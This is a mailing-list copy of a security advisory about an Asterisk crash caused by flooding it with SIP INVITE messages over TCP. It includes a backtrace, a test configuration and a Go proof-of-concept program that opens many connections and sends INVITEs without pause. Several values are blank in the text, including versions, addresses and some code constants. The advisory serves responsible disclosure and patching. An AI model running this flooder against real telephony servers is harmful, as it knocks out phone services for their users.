  oss-security - Advisory: - Asterisk crash due to INVITE flood over TCP            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 06 Nov From: "Sandro Gauci" <sandro@...blesecurity.com> To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com,  fulldisclosure@...lists.org, voipsec@...psa.org,  submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org Subject: Advisory: - Asterisk crash due to INVITE flood over TCP  # Asterisk crash due to INVITE flood over TCP  - Fixed versions: - Enable Security Advisory: - Asterisk Security Advisory: - Tested vulnerable versions: - Timeline:     - Report date: 	- Triaged: 	- Fix provided for testing: 	- Asterisk release with fix: 	- Enable Security advisory:  ## Description  When an Asterisk instance is flooded with INVITE messages over TCP, it was observed that after some time Asterisk crashes due to a segmentation fault. The backtrace generated after the crash is:  ```        PJ_ASSERT_RETURN((cseq=(pjsip_cseq_hdr*)pjsip_msg_find_hdr(tdata->msg, PJSIP_H_CSEQ, NULL))!=NULL (gdb) bt #0  in pjsip_inv_send_msg at #1  in ast_sip_session_send_response at #2  in new_invite at #3  in handle_new_invite_request at #4  in session_on_rx_request at #5  in pjsip_endpt_process_rx_data <param>, at #6  in distribute at #7  in ast_taskprocessor_execute at #8  in execute_tasks at #9  in ast_taskprocessor_execute at #10 in threadpool_execute at #11 in worker_active at #12 in worker_start at #13 in dummy_start at #14 in start_thread (arg=<optimized out>) at #15 in clone () at ```  ## Impact  Abuse of this vulnerability leads to denial of service in Asterisk when SIP over TCP is in use.  ## How to reproduce the issue  The following `pjsip.conf` configuration file was used to facilitate the reproduction of this issue:  ``` [global] debug=yes  [transport-tcp] type = transport protocol = tcp bind =  [anonymous] type = endpoint context = anon allow = all ```  The following code in Go can be used to reproduce this issue:  ```go package main  import ( 	"bytes" 	"flag" 	"fmt" 	"math/rand" 	"net" 	"strconv" 	"strings" 	"time" )  const charset =  func init() { 	rand.Seed(time.Now().UnixNano()) }  func randstr(length int) string { 	b := make([]byte, length) 	for i := range b { 		b[i] = charset[rand.Intn(len(charset))] 	} 	return string(b) }  type loop struct { 	host   string 	port   int 	conn   net.Conn 	invite []byte 	cseq   int }  func (l *loop) start() { 	sdp := "v=0\r\n" 	sdp += "o=- IN IP4 	sdp += "s=-\r\n" 	sdp += "c=IN IP4 	sdp += "t=0 0\r\n" 	sdp += "m=audio RTP/AVP 0\r\n" 	sdp += "a=rtpmap:0 	sdp += "a=sendrecv\r\n"  	invite := "INVITE SIP/2.0\r\n" 	invite += "Via: SIP/2.0/UDP 	invite += "Max-Forwards: 70\r\n" 	invite += "From: 	invite += "To: 	invite += "Call-ID: 	invite += "CSeq: _CSEQ_ INVITE\r\n" 	invite += "Contact: 	invite += fmt.Sprintf("Content-Length: %d\r\n", len(sdp)) 	invite += "Content-Type: application/sdp\r\n" 	invite += "\r\n" 	invite += sdp  	l.invite = []byte(invite)  	var err error 	l.conn, err = net.DialTimeout("tcp4", fmt.Sprintf("%s:%d", l.host, l.port), 5*time.Second) 	if err != nil { 		fmt.Println(err.Error()) 		time.Sleep(10 * time.Millisecond) 		go l.start() 		return 	}  	if l.conn != nil { 		l.run() 	} else { 		time.Sleep(10 * time.Millisecond) 		go l.start() 	} }  func (l *loop) run() { 	if err := l.conn.SetWriteDeadline(time.Now().Add(10 * time.Millisecond)); err != nil { 		if strings.Contains(err.Error(), "use of closed network connection") { 			l.start() 		}  	}  	var err error 	for { 		l.cseq++ 		inv := l.invite 		inv = bytes.ReplaceAll(inv, []byte("_BRANCH_"), []byte(randstr(8))) 		inv = bytes.ReplaceAll(inv, []byte("_CSEQ_"), []byte(strconv.Itoa(l.cseq)))  		if _, err = l.conn.Write(inv); err != nil { 			go l.start() 			return 		} 	} }  func main() { 	var port = flag.Int("p", "Port") 	var host = flag.String("h", "Host") 	flag.Parse()  	for i := 0; i < i++ { 		go func() { 			l := loop{ 				host: *host, 				port: *port, 			} 			l.start() 		}() 	} 	select {} } ```  ## Solution and recommendations  Apply the patch provided by Asterisk or upgrade to a fixed version.  Enable Security would like to thank Kevin Harwell, Joshua C. Colp and the staff at Asterisk for the very quick response and fixing this security issue.  ## About Enable Security  [Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.  ## Disclaimer  The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  ## Disclosure policy  This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      